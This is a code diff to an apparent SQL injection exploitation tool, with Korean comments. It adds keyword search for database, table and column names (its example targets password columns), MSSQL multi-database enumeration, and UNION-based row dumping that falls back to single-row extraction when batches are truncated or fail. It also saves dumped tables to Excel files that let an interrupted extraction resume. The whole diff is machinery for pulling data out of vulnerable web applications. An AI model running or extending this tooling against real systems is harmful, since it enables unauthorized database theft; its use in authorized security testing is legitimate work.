+        schema, name = _mssql_split_table(table)
+        total_q = f"SELECT COUNT(*) FROM {qdb}.{_qid(ctx, schema)}.{_qid(ctx, name)}"
     else:
         total_q = f"SELECT COUNT(*) FROM {qdb}.{qtbl}"
     return _extract_int(ctx, total_q)
+
+
+def count_search(ctx: ExtractCtx, target: str, match: str, keyword: str) -> Optional[int]:
+    """특수 검색모드 결과 총 개수. MSSQL의 table/column은 전체 DB를 순회해 합산한다(비용 큼)."""
+    if target not in ("database", "table", "column"):
+        raise UnsupportedTechniqueError(f"검색 대상 미지원: {target}")
+    if match not in ("contains", "exact"):
+        raise UnsupportedTechniqueError(f"매칭 방식 미지원: {match}")
+
+    if ctx.dbms == "SQLite" and target == "database":
+        matched = (keyword in "main") if match == "contains" else (keyword == "main")
+        return 1 if matched else 0
+
+    if ctx.dbms == "MSSQL" and target in ("table", "column"):
+        cache_key = (target, match, keyword)
+        # 캐시된 per-DB 카운트가 있으면 합산만 반환 (_search_mssql_multidb 공유)
+        if cache_key in ctx._mssql_search_counts:
+            return sum(c for _, c in ctx._mssql_search_counts[cache_key])
+        dbs = _mssql_all_db_names(ctx)
+        per_db: List[Tuple[str, int]] = []
+        total = 0
+        for db in dbs:
+            if ctx.cancelled:
+                break
+            qdb = _qid(ctx, db)
+            cnt = _extract_int(ctx, _q_search_count_mssql_db(target, qdb, match, keyword)) or 0
+            if cnt > 0:
+                per_db.append((db, cnt))
+            total += cnt
+        ctx._mssql_search_counts[cache_key] = per_db
+        return total
+
+    return _extract_int(ctx, _q_search_count(ctx.dbms, target, match, keyword))
+
+
+def search(ctx: ExtractCtx, target: str, match: str, keyword: str,
+          total: Optional[int] = None,
+          items_out: Optional[List[str]] = None,
+          progress_cb: Optional[Callable[[int, int], None]] = None,
+          ) -> List[str]:
+    """DB명/테이블명/컬럼명 특수 검색 — 위치 목록(raw 문자열)을 반환한다.
+
+    target="database": 결과 원소 = DB명 그대로
+    target="table":    결과 원소 = "db{DUMP_DELIM}table"
+    target="column":   결과 원소 = "db{DUMP_DELIM}table{DUMP_DELIM}column"
+
+    기법·주입 컨텍스트·커스텀 페이로드는 ctx에 이미 확정된 값을 그대로 사용한다
+    (세션 시작 시 fingerprint로 결정된 값과 동일 — 검색 전용 재선택 없음).
+    """
+    if target not in ("database", "table", "column"):
+        raise UnsupportedTechniqueError(f"검색 대상 미지원: {target}")
+    if match not in ("contains", "exact"):
+        raise UnsupportedTechniqueError(f"매칭 방식 미지원: {match}")
+
+    if ctx.dbms == "SQLite" and target == "database":
+        items = items_out if items_out is not None else []
+        if not items:
+            matched = (keyword in "main") if match == "contains" else (keyword == "main")
+            if matched:
+                items.append("main")
+        if progress_cb:
+            progress_cb(1, 1)
+        return items
+
+    if ctx.dbms == "MSSQL" and target in ("table", "column"):
+        return _search_mssql_multidb(ctx, target, match, keyword,
+                                     progress_cb=progress_cb, items_out=items_out)
+
+    if total is None:
+        total = count_search(ctx, target, match, keyword) or 0
+
+    return _list_items(ctx, total, lambda n: _q_search_row(ctx.dbms, target, match, keyword, n),
+                       batch_base_select=_q_search_base(ctx.dbms, target, match, keyword),
+                       progress_cb=progress_cb, items_out=items_out)
 
 
 def dump_table(ctx: ExtractCtx, db: str, table: str, columns: List[str],
@@ -1595,12 +2227,33 @@ def dump_table(ctx: ExtractCtx, db: str, table: str, columns: List[str],
     if ctx.technique == "union" and ctx.union_row_batch > 1:
         batch = ctx.union_row_batch
         n = start
+        batch_degraded = False  # 첫 잘림/실패 감지 시 True → 이후 1행씩 직행
+
         while n < total:
             if ctx.cancelled:
                 break
             window = min(batch, total - n)  # 마지막 윈도우는 남은 행 수만큼
 
-            # 묶음 쿼리 — 실패(None) 시 윈도우 전체 폴백
+            # 강등 상태: 묶음 재시도 없이 1행씩 직행
+            if batch_degraded:
+                for i in range(n, n + window):
+                    if ctx.cancelled:
+                        break
+                    try:
+                        raw = _extract_single(ctx, _q_row_dump(ctx, db, table, row_select, i))
+                    except WAFBlockedError:
+                        raise
+                    except InterruptedError:
+                        raise
+                    except Exception:
+                        raw = None
+                    rows.append(_parse_row_raw(raw, len(columns)))
+                    if progress_cb:
+                        progress_cb(i + 1, total)
+                n += window
+                continue
+
+            # 묶음 쿼리 시도
             try:
                 batch_query = _q_row_dump_batch(ctx, db, table, row_select, n, window)
                 raw_batch = _union_extract(ctx, batch_query)
@@ -1612,7 +2265,8 @@ def dump_table(ctx: ExtractCtx, db: str, table: str, columns: List[str],
                 raw_batch = None
 
             if raw_batch is None:
-                # 묶음 추출 실패 — 윈도우 전체를 1행씩 폴백
+                # 묶음 실패 — 강등 후 윈도우 전체 1행씩 폴백
+                batch_degraded = True
                 for i in range(n, n + window):
                     if ctx.cancelled:
                         break
@@ -1641,8 +2295,9 @@ def dump_table(ctx: ExtractCtx, db: str, table: str, columns: List[str],
                 if progress_cb:
                     progress_cb(n + ri + 1, total)
 
-            # 잘림 감지 — 기대 행 수보다 적으면 나머지 구간 1행씩 폴백
+            # 잘림 감지 — 강등 후 나머지 구간 1행씩 폴백
             if got < window:
+                batch_degraded = True
                 fallback_start = n + got
                 fallback_end = n + window
                 for i in range(fallback_start, fallback_end):
@@ -1742,28 +2397,33 @@ def _restore_cell_value(v: Any) -> str:
 
 
 def save_to_excel(extracted: Dict[str, Any], target_url: str,
-                  output_dir: str, excel_name: Optional[str] = None) -> List[str]:
+                  output_dir: str, excel_name: Optional[str] = None,
+                  file_prefix: str = "extract") -> List[str]:
     """추출 결과를 엑셀 파일로 저장.
 
-    마스터 파일 (extract_<name>_DBfingerprint.xlsx):
+    마스터 파일 (<file_prefix>_<name>_DBfingerprint.xlsx):
       - INFO 시트: 메타 + Fingerprint 결과(DBMS/기법/컨텍스트/UNION 정보)
       - DBList 시트: 추출된 DB 목록
+      - SearchResult 시트: extracted["search"]가 있을 때만 (검색대상/매칭방식/키워드/위치)
 
-    DB별 파일 (extract_<name>_<db>.xlsx):
+    DB별 파일 (<file_prefix>_<name>_<db>.xlsx):
       - INFO 시트: 메타
       - _TableMap 시트: 시트명 ↔ 원본 테이블명 (복원 시 정확한 테이블명 보장)
       - <테이블별> 시트: 1행=컬럼 헤더, 2행~=행 데이터
 
     excel_name이 None이면 "extract"를 사용한다.
+    file_prefix는 특수 검색모드가 일반 추출 파일과 완전히 격리된 이름
+    (예: search(column-passw))으로 저장하기 위해 사용 — 기본값은 기존 동작과 동일.
     파일명은 항상 고정 — 동일 이름으로 호출 시 덮어쓰기.
     """
     from openpyxl import Workbook  # lazy import — 추출 모드 진입 시점에만 필요
 
     os.makedirs(output_dir, exist_ok=True)
     saved_paths: List[str] = []
+    safe_prefix = _safe_filename(file_prefix or "extract")
     safe_name = _safe_filename(excel_name or "extract")
 
-    # 1. 마스터 파일 항상 생성 (INFO + DBList)
+    # 1. 마스터 파일 항상 생성 (INFO + DBList [+ SearchResult])
     master_wb = Workbook()
     master_info_ws = master_wb.active
     master_info_ws.title = "INFO"
@@ -1774,13 +2434,36 @@ def save_to_excel(extracted: Dict[str, Any], target_url: str,
     for db in (extracted.get("databases") or []):
         dblist_ws.append([_safe_cell_value(db)])
 
-    master_path = os.path.join(output_dir, f"extract_{safe_name}_DBfingerprint.xlsx")
+    # 특수 검색모드 결과 — extracted["search"]가 있을 때만 SearchResult 시트 추가
+    search_meta = extracted.get("search")
+    if search_meta:
+        sres_ws = master_wb.create_sheet(title="SearchResult")
+        # DB/테이블/컬럼 컬럼 추가 — load_search_from_excel이 hits_raw 복원에 사용
+        sres_ws.append(["검색대상", "매칭방식", "키워드", "위치", "DB", "테이블", "컬럼"])
+        target_label = {"database": "DB", "table": "Table", "column": "Column"}.get(
+            search_meta.get("target", ""), search_meta.get("target", ""))
+        match_label = {"contains": "포함", "exact": "정확히 일치"}.get(
+            search_meta.get("match", ""), search_meta.get("match", ""))
+        for hit in (search_meta.get("hits") or []):
+            # hit = {"db","table","column","display"} — 표시(display)와 복원(DB/Table/Column) 병기
+            sres_ws.append([
+                _safe_cell_value(target_label),
+                _safe_cell_value(match_label),
+                _safe_cell_value(search_meta.get("keyword", "")),
+                _safe_cell_value(hit.get("display", "")),
+                _safe_cell_value(hit.get("db") or ""),
+                _safe_cell_value(hit.get("table") or ""),
+                _safe_cell_value(hit.get("column") or ""),
+            ])
+
+    master_path = os.path.join(output_dir, f"{safe_prefix}_{safe_name}_DBfingerprint.xlsx")
     master_wb.save(master_path)
     saved_paths.append(os.path.abspath(master_path))
 
     # 2. DB별 파일 생성
     dumps: Dict[str, Dict[str, Any]] = extracted.get("dumps", {}) or {}
     tables_index: Dict[str, List[str]] = extracted.get("tables", {}) or {}
+    columns_index: Dict[str, List[str]] = extracted.get("columns", {}) or {}
 
     by_db: Dict[str, List[Tuple[str, Dict[str, Any]]]] = {}
     for key, payload in dumps.items():
@@ -1793,30 +2476,49 @@ def save_to_excel(extracted: Dict[str, Any], target_url: str,
     for db in tables_index:
         by_db.setdefault(db, [])
 
+    # 검색모드 드릴다운(테이블 히트 → 컬럼 목록만 추출)은 tables/dumps를 거치지 않고
+    # columns만 채워지므로, columns_index의 "db.tbl" 키에서도 DB를 등록해야 파일이 생성된다.
+    cols_by_db: Dict[str, List[str]] = {}
+    for col_key in columns_index:
+        if "." in col_key:
+            db, tbl = col_key.split(".", 1)
+        else:
+            continue
+        cols_by_db.setdefault(db, []).append(tbl)
+        by_db.setdefault(db, [])
+
     for db, tbl_list in by_db.items():
         wb = Workbook()
         info_ws = wb.active
         info_ws.title = "INFO"
         _write_info_sheet(info_ws, extracted, db)
 
-        # _TableMap 시트 — 시트명 ↔ 원본 테이블명 매핑 (load_from_excel 복원용)
+        # _TableMap 시트 — 시트명 ↔ 원본 테이블명 ↔ 컬럼 총개수 매핑 (load_from_excel 복원용)
         used_sheets: set = {"INFO", "_TABLEMAP"}
         tmap_ws = wb.create_sheet(title="_TableMap")
-        tmap_ws.append(["시트명", "원본 테이블명"])
+        tmap_ws.append(["시트명", "원본 테이블명", "총 컬럼수"])
 
         # dump된 테이블을 O(1) 조회용 dict으로 변환
         dump_dict: Dict[str, Dict[str, Any]] = {tbl: payload for tbl, payload in tbl_list}
+        col_totals: Dict[str, int] = extracted.get("totals", {}).get("columns", {}) or {}
 
-        # tables_index 순서를 기준으로, dumps에만 존재하는 테이블은 뒤에 추가
+        # tables_index 순서를 기준으로, dumps/columns에만 존재하는 테이블은 뒤에 추가
         ordered_tables = list(tables_index.get(db, []))
         ordered_set = set(ordered_tables)
         for tbl in dump_dict:
             if tbl not in ordered_set:
                 ordered_tables.append(tbl)
+                ordered_set.add(tbl)
+        for tbl in cols_by_db.get(db, []):
+            if tbl not in ordered_set:
+                ordered_tables.append(tbl)
+                ordered_set.add(tbl)
 
         for tbl in ordered_tables:
             sheet_name = _safe_sheet_name(tbl, used_sheets)
-            tmap_ws.append([_safe_cell_value(sheet_name), _safe_cell_value(tbl)])
+            total_cols = col_totals.get(f"{db}.{tbl}")
+            tmap_ws.append([_safe_cell_value(sheet_name), _safe_cell_value(tbl),
+                           _safe_cell_value("" if total_cols is None else total_cols)])
             ws = wb.create_sheet(title=sheet_name)
             col_key = f"{db}.{tbl}"
             payload = dump_dict.get(tbl)
@@ -1834,7 +2536,7 @@ def save_to_excel(extracted: Dict[str, Any], target_url: str,
                     ws.append([_safe_cell_value(c) for c in cached_cols])
 
         db_path = os.path.join(output_dir,
-                               f"extract_{safe_name}_{_safe_filename(db)}.xlsx")
+                               f"{safe_prefix}_{safe_name}_{_safe_filename(db)}.xlsx")
         wb.save(db_path)
         saved_paths.append(os.path.abspath(db_path))
 
@@ -1850,6 +2552,10 @@ def _write_info_sheet(ws, extracted: Dict[str, Any], db_name: str) -> None:
     info = extracted.get("dbms_info", {}) or {}
     ctx_val = meta.get("context")
     union_types = meta.get("union_types") or []
+    # 리스트 총개수 — db_name=""(마스터)이면 DB 총개수, 특정 db면 해당 DB의 테이블 총개수
+    totals = extracted.get("totals", {}) or {}
+    total_db  = totals.get("databases")
+    total_tbl = (totals.get("tables") or {}).get(db_name) if db_name else None
     rows = [
         ("Target",        meta.get("target", "")),
         ("Method",        meta.get("method", "")),
@@ -1858,12 +2564,16 @@ def _write_info_sheet(ws, extracted: Dict[str, Any], db_name: str) -> None:
         ("DBMS",          meta.get("dbms", "")),
         ("Technique",     meta.get("technique", "")),
         ("Context",       "" if ctx_val is None else ctx_val),
+        ("Position",      meta.get("position", "where") or "where"),
+        ("Blind Template", meta.get("blind_template") or ""),
         ("Database",      db_name),
         ("Started",       meta.get("started_at", "")),
         ("Finished",      meta.get("finished_at", "")),
         ("Version",       info.get("version", "")),
         ("User",          info.get("user", "")),
         ("Current DB",    info.get("current_db", "")),
+        ("Total Databases", "" if total_db is None else str(total_db)),
+        ("Total Tables",    "" if total_tbl is None else str(total_tbl)),
         # UNION 정보 — load_from_excel 복원 전용
         ("Union Columns", str(meta.get("union_columns") or 0)),
         ("Union Types",   ",".join(str(t) for t in union_types)),
@@ -1872,6 +2582,17 @@ def _write_info_sheet(ws, extracted: Dict[str, Any], db_name: str) -> None:
     ]
     for k, v in rows:
         ws.append([_safe_cell_value(k), _safe_cell_value(v)])
+    # 검색 메타 — load_search_from_excel 복원 전용. 마스터 파일(db_name="")에만 기록.
+    search_info = extracted.get("search") if not db_name else None
+    if search_info:
+        for k, v in [
+            ("Search Target",  search_info.get("target", "")),
+            ("Search Match",   search_info.get("match", "")),
+            ("Search Keyword", search_info.get("keyword", "")),
+            ("Search Total",   "" if search_info.get("total") is None
+                               else str(search_info["total"])),
+        ]:
+            ws.append([_safe_cell_value(k), _safe_cell_value(v)])
 
 
 # ── 누적 dict 초기화 헬퍼 (호출부 공용) ─────────────────────────────────────
@@ -1890,6 +2611,8 @@ def init_extracted(ctx: ExtractCtx) -> Dict[str, Any]:
             "dbms":             ctx.dbms,
             "technique":        ctx.technique,
             "context":          ctx.quote_context,
+            "position":         ctx.position or "where",
+            "blind_template":   ctx.blind_template or "",
             "started_at":       datetime.now().isoformat(),
             "finished_at":      "",
             "union_columns":    ctx.union_columns,
@@ -1901,6 +2624,8 @@ def init_extracted(ctx: ExtractCtx) -> Dict[str, Any]:
         "tables":    {},
         "columns":   {},
         "dumps":     {},
+        # 리스트별 총개수 — 부분 추출 여부 판정(이어받기 팝업)에 사용
+        "totals": {"databases": None, "tables": {}, "columns": {}},
     }
 
 
@@ -1925,7 +2650,8 @@ def find_existing_extract(excel_name: str,
         if "INFO" in wb.sheetnames:
             for row in wb["INFO"].iter_rows(values_only=True):
                 if row and len(row) >= 2 and row[0] is not None:
-                    info_map[str(row[0])] = str(row[1]) if row[1] is not None else ""
+                    info_map[str(row[0])] = (
+                        _restore_cell_value(row[1]) if row[1] is not None else "")
 
         db_count = 0
         if "DBList" in wb.sheetnames:
@@ -1937,6 +2663,8 @@ def find_existing_extract(excel_name: str,
             "dbms":             info_map.get("DBMS", ""),
             "technique":        info_map.get("Technique", ""),
             "context":          info_map.get("Context", ""),
+            "position":         info_map.get("Position", "where") or "where",
+            "blind_template":   info_map.get("Blind Template", "") or "",
             "union_columns":    int(info_map.get("Union Columns", "0") or "0"),
             "union_types":      [t for t in union_types_raw.split(",") if t],
             "union_visible_idx": int(info_map.get("Union Visible", "-1") or "-1"),
@@ -1967,6 +2695,7 @@ def load_from_excel(excel_name: str,
     extracted: Dict[str, Any] = {
         "meta": {}, "dbms_info": {"version": "", "user": "", "current_db": ""},
         "databases": [], "tables": {}, "columns": {}, "dumps": {},
+        "totals": {"databases": None, "tables": {}, "columns": {}},
     }
     ctx_meta: Dict[str, Any] = {}
 
@@ -1990,6 +2719,8 @@ def load_from_excel(excel_name: str,
                 "dbms":             info_map.get("DBMS", ""),
                 "technique":        info_map.get("Technique", ""),
                 "context":          info_map.get("Context", ""),
+                "position":         info_map.get("Position", "where") or "where",
+                "blind_template":   info_map.get("Blind Template", "") or "",
                 "started_at":       info_map.get("Started", ""),
                 "finished_at":      info_map.get("Finished", ""),
                 "union_columns":    int(info_map.get("Union Columns", "0") or "0"),
@@ -2001,10 +2732,15 @@ def load_from_excel(excel_name: str,
                 "user":       info_map.get("User", ""),
                 "current_db": info_map.get("Current DB", ""),
             }
+            total_db_raw = info_map.get("Total Databases", "")
+            extracted["totals"]["databases"] = (
+                int(total_db_raw) if total_db_raw not in ("", None) else None)
             ctx_meta = {
                 "dbms":             info_map.get("DBMS", ""),
                 "technique":        info_map.get("Technique", ""),
                 "context":          info_map.get("Context", ""),  # "" = numeric
+                "position":         info_map.get("Position", "where") or "where",
+                "blind_template":   info_map.get("Blind Template", "") or "",
                 "union_columns":    int(info_map.get("Union Columns", "0") or "0"),
                 "union_types":      union_types,
                 "union_visible_idx": int(info_map.get("Union Visible", "-1") or "-1"),
@@ -2034,7 +2770,15 @@ def load_from_excel(excel_name: str,
         try:
             wb = load_workbook(db_path, read_only=True, data_only=True)
 
-            # _TableMap → 원본 테이블명 (순서 보존)
+            # DB별 INFO 시트 — Total Tables 복원
+            if "INFO" in wb.sheetnames:
+                for row in wb["INFO"].iter_rows(values_only=True):
+                    if row and len(row) >= 2 and row[0] == "Total Tables" and row[1] is not None:
+                        raw = _restore_cell_value(row[1])
+                        extracted["totals"]["tables"][db] = int(raw) if raw else None
+                        break
+
+            # _TableMap → 원본 테이블명 + 컬럼 총개수 (순서 보존)
             tmap: Dict[str, str] = {}  # sheet_name → original_table_name
             if "_TableMap" in wb.sheetnames:
                 first_row = True
@@ -2043,7 +2787,12 @@ def load_from_excel(excel_name: str,
                         first_row = False
                         continue
                     if row and len(row) >= 2 and row[0] and row[1] is not None:
-                        tmap[str(row[0])] = _restore_cell_value(row[1])
+                        orig_nm = _restore_cell_value(row[1])
+                        tmap[str(row[0])] = orig_nm
+                        if len(row) >= 3 and row[2] not in (None, ""):
+                            total_cols_raw = _restore_cell_value(row[2])
+                            if total_cols_raw:
+                                extracted["totals"]["columns"][f"{db}.{orig_nm}"] = int(total_cols_raw)
 
             extracted.setdefault("tables", {})[db] = list(tmap.values())
 
@@ -2072,3 +2821,81 @@ def load_from_excel(excel_name: str,
             continue
 
     return extracted, ctx_meta
+
+
+def load_search_from_excel(excel_name: str, search_prefix: str,
+                           output_dir: str,
+                           ) -> Optional[Tuple[List[str], Dict[str, Any]]]:
+    """검색 결과 엑셀 파일에서 이전 hits_raw + 메타를 복원.
+
+    Returns (hits_raw: List[str], meta: {target,match,keyword,total}) or None.
+    - INFO 시트에 "Search Total" 키가 없으면 구버전 파일 → None 반환(재개 불가).
+    - hits_raw 복원: SearchResult 시트의 DB/테이블/컬럼 컬럼을 DUMP_DELIM으로 결합.
+    - hits 재구성은 호출부(app.py)가 _parse_search_hit으로 담당.
+    """
+    from openpyxl import load_workbook  # noqa: F401 (lazy)
+
+    safe_prefix = _safe_filename(search_prefix or "extract")
+    safe_name   = _safe_filename(excel_name or "extract")
+    master_path = os.path.join(output_dir, f"{safe_prefix}_{safe_name}_DBfingerprint.xlsx")
+    if not os.path.exists(master_path):
+        return None
+
+    try:
+        wb = load_workbook(master_path, read_only=True, data_only=True)
+
+        if "INFO" not in wb.sheetnames:
+            wb.close()
+            return None
+
+        # INFO 시트에서 검색 메타 복원
+        info_map: Dict[str, str] = {}
+        for row in wb["INFO"].iter_rows(values_only=True):
+            if row and len(row) >= 2 and row[0] is not None:
+                info_map[str(row[0])] = (
+                    _restore_cell_value(row[1]) if row[1] is not None else "")
+
+        # Search Total 키가 없으면 구버전 파일 — 재개 불가
+        if "Search Total" not in info_map:
+            wb.close()
+            return None
+
+        total_raw = info_map.get("Search Total", "")
+        try:
+            total = int(total_raw) if total_raw else 0
+        except ValueError:
+            total = 0
+
+        meta: Dict[str, Any] = {
+            "target":  info_map.get("Search Target", ""),
+            "match":   info_map.get("Search Match", ""),
+            "keyword": info_map.get("Search Keyword", ""),
+            "total":   total,
+        }
+
+        # SearchResult 시트에서 hits_raw 복원 (DB/테이블/컬럼 컬럼 → DUMP_DELIM 결합)
+        hits_raw: List[str] = []
+        if "SearchResult" in wb.sheetnames:
+            first_row = True
+            for row in wb["SearchResult"].iter_rows(values_only=True):
+                if first_row:
+                    first_row = False
+                    continue  # 헤더 건너뜀
+                if not row or len(row) < 5:
+                    continue
+                # 컬럼 순서: 검색대상|매칭방식|키워드|위치|DB|테이블|컬럼
+                db_val  = _restore_cell_value(row[4]) if row[4] is not None else ""
+                tbl_val = (_restore_cell_value(row[5])
+                           if len(row) > 5 and row[5] is not None else "")
+                col_val = (_restore_cell_value(row[6])
+                           if len(row) > 6 and row[6] is not None else "")
+                if not db_val:
+                    continue
+                # 비어있지 않은 필드만 DUMP_DELIM으로 결합 → hits_raw 원문 재구성
+                parts = [p for p in (db_val, tbl_val, col_val) if p]
+                hits_raw.append(DUMP_DELIM.join(parts))
+
+        wb.close()
+        return hits_raw, meta
+    except Exception:
+        return None
